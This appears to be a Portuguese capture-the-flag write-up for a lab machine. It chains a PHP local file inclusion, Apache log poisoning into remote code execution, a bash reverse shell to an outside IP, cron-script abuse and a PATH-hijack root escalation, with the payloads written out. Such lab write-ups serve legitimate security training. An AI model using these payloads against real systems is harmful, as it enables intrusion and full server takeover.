Enumeração dos serviços:
![[Pasted image 20240126072921.png]]
Descoberta de um hostname:
![[Pasted image 20240126075211.png]]
Inclusão do hostname em `etc/hosts`:
![[Pasted image 20240126075351.png]]
Flag 1:
![[Pasted image 20240126075533.png]]
Enumeração de diretórios e arquivos, com descoberta da página /test.php:
![[Pasted image 20240126080126.png]]
A página carregada apresenta um botão que ao clicar somos redirecionados para um arquivo dentro do servidor, exibindo o caminho absoluto do mesmo. Isso nos da a ideia de um LFI, podemos tentar converter a página em Base64 utilizando o wraper filter do PHP:
`http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php`
Output:
![[Pasted image 20240126084734.png]]
Vamos visualizar o código da página test.php e entender como está sendo feita a validação do parâmetro:
![[Pasted image 20240126084949.png]]
São feitas duas validações, a primeira o valor no parâmetro é diferente de `../..` e se existe o caminho `/var/www/html/development_testing`. Vamos então manipular o valor do parâmetro de forma que as duas validações sejam verdadeiras incluindo duas barras ao invés de uma:
![[Pasted image 20240126085250.png]]
Com alguns testes, identificamos o arquivo de log do apache em `var/log/apache2/access.log` podemos então evoluir o LFI para um RCE. Vamos alterar o User-Agent para `<?php system($_GET['lord']); ?>` utilizando um complemento do navegador ou o Burp Suite. Depois podemos acessar a página de log, incluindo o parâmetro `&lord=id` e confirmamos a saída do comando no final da página:
![[Pasted image 20240126090509.png]]
Com o RCE funcionando, vamos pegar uma Shell reversa com o payload: `/bin/bash -c 'bash -i > /dev/tcp/10.9.58.140/443 0>%261'`
![[Pasted image 20240126091531.png]]
Analisando os arquivos do sistema, identificamos um script do usuário archangel rodando a cada 1 minuto:
![[Pasted image 20240126095436.png]]
Vamos então manipular o script para enviar uma nova shell reversa, dessa vez do usuário archangel:
![[Pasted image 20240126095530.png]]
E temos a shell do usuário:
![[Pasted image 20240126095919.png]]
Analisando os arquivos com permissão SUID, descobrimos o binário `backup` na pasta `home/archangel/secret/backup`. Ao executá-lo o binário tenta fazer a cópia de alguns arquivos utilizando o utilitário `cp`.
Podemos então criar um `cp` falso que irá chamar a shell.
```
echo '#!/bin/bash' > cp
echo '' >> cp
echo 'bash -p' >> cp
```
Agora alteramos a variável PATH para que o `cp` falso seja executado:
`export PATH=/tmp`
E executamos o binário com SUID:
![[Pasted image 20240126110025.png]]